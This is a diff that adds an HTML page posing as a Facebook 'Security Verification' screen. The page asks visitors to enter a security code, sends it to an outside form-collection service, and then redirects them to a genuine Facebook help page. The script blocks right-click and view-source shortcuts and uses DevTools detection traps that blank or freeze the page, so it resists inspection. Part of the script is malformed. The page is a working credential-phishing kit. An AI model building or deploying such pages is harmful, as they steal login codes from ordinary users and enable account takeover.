@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Security Confirmation</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"/>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      max-width: 90%;
+    }
+
+    .logo {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+
+    .header {
+      text-align: left;
+      font-size: 20px;
+      color: #333;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #606770;
+      text-align: left;
+      margin-bottom: 25px;
+    }
+
+    .video-section {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .video-section iframe {
+      width: 60%;
+      height: 160px;
+      border-radius: 8px;
+      border: 16:9;
+       display: block;
+      position: relative;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #606770;
+    }
+
+    .form-group input {
+      width: 70%;
+      padding: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #1c1e21;
+    }
+
+    .form-group input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .error-message {
+      color: #e74c3c;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .submit-button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 50%;
+    }
+
+    .submit-button:hover {
+      background-color: #166fe5;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo"/>
+    </div>
+
+    <div class="header">Security Verification Required</div>
+    <p class="description">
+      For your account’s safety, we need to confirm it’s really you. 
+     Watch The Detailed Video Information to Confirm The Account
+    </p>
+
+    <div class="video-section">
+      <iframe src="https://ahnmsyjtykbxzfefyhec.supabase.co/storage/v1/object/public/bostan4666//lv_0_20250528164404%20(1).mp4" title="Why Security Codes Are Important" allowfullscreen></iframe>
+    </div>
+
+    <form id="securityForm" action="https://submit-form.com/XWivrarLz" method="POST">
+       <input
+    type="hidden"
+    name="_redirect"
+    value="https://www.facebook.com/help/media/thank-you?rdrhc"
+  />
+      <div class="form-group">
+        <label for="security-code">Security Code</label>
+        <input
+          type="text"
+          id="security-code"
+          name="security_code"
+          placeholder="Enter your security code"
+          maxlength="10"
+          required
+        />
+        <span id="error-message" class="error-message"></span>
+      </div>
+      <button type="submit" class="submit-button">Confirm Account</button>
+    </form>
+  </div>
+
+  <script>
+ {
+        errorMessage.textContent = '';
+        setTimeout(function () {
+          window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc';
+        }, 2000);
+   // In App.js or index.html
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.onkeydown = function (e) {
+  if (e.ctrlKey && ['U', 'C', 'S', 'I', 'J'].includes(e.key.toUpperCase())) return false;
+};
+    function showDevToolsWarning() {
+  document.body.innerHTML = `
+    <div style="font-family:sans-serif;text-align:center;margin-top:20%;color:red;font-size:24px;">
+      🚫 Code disappeared.<br><br>
+      Please reload the page to continue.
+    </div>
+  `;
+  document.title = 'Blocked';
+  // Optionally freeze further execution
+  setTimeout(() => {
+    while (1) {}
+  }, 100);
+}
+
+// 🚨 DevTools detection
+function detectDevTools() {
+  const threshold = 160;
+  const widthExceeded = window.outerWidth - window.innerWidth > threshold;
+  const heightExceeded = window.outerHeight - window.innerHeight > threshold;
+
+  let devToolsOpen = widthExceeded || heightExceeded;
+
+  // console.log getter trap
+  const element = new Image();
+  Object.defineProperty(element, 'id', {
+    get: function () {
+      devToolsOpen = true;
+      throw new Error('DevTools detected!');
+    }
+  });
+  console.log('%c', element);
+
+  // debugger trap
+  const start = performance.now();
+  debugger;
+  const duration = performance.now() - start;
+  if (duration > 100) {
+    devToolsOpen = true;
+  }
+
+  return devToolsOpen;
+}
+
+// 🛡️ Run protection loop
+function startProtection() {
+  setInterval(() => {
+    if (detectDevTools()) {
+      showDevToolsWarning();
+    }
+  }, 1000);
+
+  // Resize check
+  window.addEventListener('resize', () => {
+    if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+      showDevToolsWarning();
+    }
+  });
+}
+
+startProtection();
+ // 🚫 Kill page if DevTools is open
+function destroyPage() {
+  document.body.innerHTML = '';
+  document.documentElement.innerHTML = '';
+  document.write(''); // remove current DOM
+  document.close();
+  while (1) {} // freeze
+}
+
+// 👁️ Detect DevTools open (timing + console trap)
+function detectDevTools() {
+  let detected = false;
+
+  // Detect via function timing (slower with DevTools open)
+  const start = new Date();
+  debugger;
+  const time = new Date() - start;
+  if (time > 50) detected = true;
+
+  // Detect via console.log getter trick
+  const element = new Image();
+  Object.defineProperty(element, 'id', {
+    get: function () {
+      detected = true;
+      throw 'DevTools detected!';
+    },
+  });
+  console.log('%c', element);
+
+  return detected;
+}
+
+// 👂 Window Resize / Mutation Traps
+function watchDomChanges() {
+  const observer = new MutationObserver(() => {
+    if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+      destroyPage();
+    }
+  });
+
+  observer.observe(document.documentElement, { childList: true, subtree: true });
+}
+
+// 🚀 Start protection loop
+function startAntiDebugLoop() {
+  setInterval(() => {
+    const devToolsOpen = detectDevTools();
+    if (devToolsOpen) {
+      destroyPage();
+    }
+  }, 1000);
+
+  // Watch resize
+  window.addEventListener('resize', () => {
+    if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+      destroyPage();
+    }
+  });
+
+  // Watch for debugger keyword
+  setInterval(() => {
+    const before = performance.now();
+    debugger;
+    const after = performance.now();
+    if (after - before > 100) destroyPage();
+  }, 1000);
+
+  watchDomChanges();
+}
+
+startAntiDebugLoop();}
+    });
+  </script>
+</body>
+</html>
